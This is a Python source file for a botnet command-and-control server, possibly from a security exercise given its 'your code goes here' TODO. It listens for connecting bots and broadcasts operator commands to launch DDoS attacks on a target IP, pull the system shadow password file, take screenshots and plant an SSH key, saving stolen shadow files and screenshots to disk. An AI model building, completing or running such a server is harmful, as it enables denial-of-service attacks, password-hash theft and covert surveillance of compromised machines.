import socket
import select
import os
import errno
import time

HEADER_LENGTH = 20

IP = "127.0.0.1"
PORT = 1338

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server_socket.bind((IP, PORT))
server_socket.listen()
sockets_list = [server_socket]

bots = {}
DATA_BUFFER = 4096

print(f'Listening for connections on {IP}:{PORT}...')

# Handles message receiving
def receive_message(bot_socket):
	try:
		message_header = bot_socket.recv(HEADER_LENGTH)
		if not len(message_header):
			return False
		header = message_header.decode('utf-8').strip().split()

		if len(header) == 2: # receiving data
			message_length = int(header[1])
			data = b""
			recv_size = DATA_BUFFER

			while len(data) < message_length:
				if len(data) + DATA_BUFFER > message_length:
					recv_size = message_length - len(data);
				b = bot_socket.recv(recv_size)

				data += b
				if not b:
					break
			ss_name = time.strftime("%Y%m%d-%H%M%S")
			path = ''
			if header[0] == "shadow":
				path = './shadow_'+ ss_name
			else:
				path = './screenshot_'+ ss_name + '.jpg'
			f = open(path, 'wb')
			f.write(data)
			f.close()

			return {'header': message_header, 'file': path, 'data': ""}

		else:
			message_length = int(header[0])
			return {'header': message_header, 'data': bot_socket.recv(message_length)}
	except socket.error as error:
		if error.errno == errno.ECONNREFUSED:
			print(os.strerror(error.errno))

		return False

def send_cmd(srv_cmd):
	cmd = srv_cmd.encode('utf-8')
	cmd_header = f"{len(cmd):<{HEADER_LENGTH}}".encode('utf-8')
	for bot_socket in bots:
		bot_socket.send(cmd_header + cmd)

fetchNew = False
while True:
	if not fetchNew:
		cmd = input("--> ")
		cmd = cmd.lower()
	else:
		fetchNew = False
		cmd = "update"
	if cmd == "help":
		print("Commands available: ")
		continue
	elif cmd == "ddos":
		ip = input("Target IP? ")
		send_cmd(cmd + " " + ip)
		continue

	elif cmd == "stop":
		send_cmd("stop")

	elif cmd == "ssh":
    	## TODO: generate a ssh key
		## ---------------------------------
		## your code goes here
		key = "incorrect"
		## ---------------------------------

		send_cmd(cmd + " " + key)
		continue

	elif cmd == "shadow":
		send_cmd("shadow")
		continue

	elif cmd == "ss" or cmd == "screenshot":
		send_cmd("screenshot")
		continue

	elif cmd == "list":
		print(bots)
		continue

	elif cmd == "update":
		print("Fetching new connections and messages from bots")

	elif cmd == "ping":
		send_cmd("ping")

	else:
		print("Unknown command {}".format(cmd))
		continue

	read_sockets, _, exception_sockets = select.select(sockets_list, [], sockets_list, 2)
	for notified_socket in read_sockets:
		if notified_socket == server_socket:
			bot_socket, bot_address = server_socket.accept()
			uid = receive_message(bot_socket)
			if uid is False:
				continue

			sockets_list.append(bot_socket)
			bots[bot_socket] = uid
			print('New bot connected from {}:{}, uid: {}'.format(*bot_address, uid['data'].decode('utf-8')))
			fetchNew = True
		else:
			message = receive_message(notified_socket)
			if message is False:
				print('Closed connection from: {}'.format(bots[notified_socket]['data'].decode('utf-8')))
				sockets_list.remove(notified_socket)
				del bots[notified_socket]
				continue

			# Get user by notified socket, so we will know who sent the message
			uid = bots[notified_socket]
			if message["data"] != "":
				print(f'Received message from {uid["data"].decode("utf-8")}: {message["data"].decode("utf-8")}')
			else:
				print(f'Received a file from {uid["data"].decode("utf-8")}: file {message["file"]}')


    # It's not really necessary to have this, but will handle some socket exceptions just in case
	for notified_socket in exception_sockets:

		# Remove from list for socket.socket()
		sockets_list.remove(notified_socket)

		# Remove from our list of users
		del bots[notified_socket]
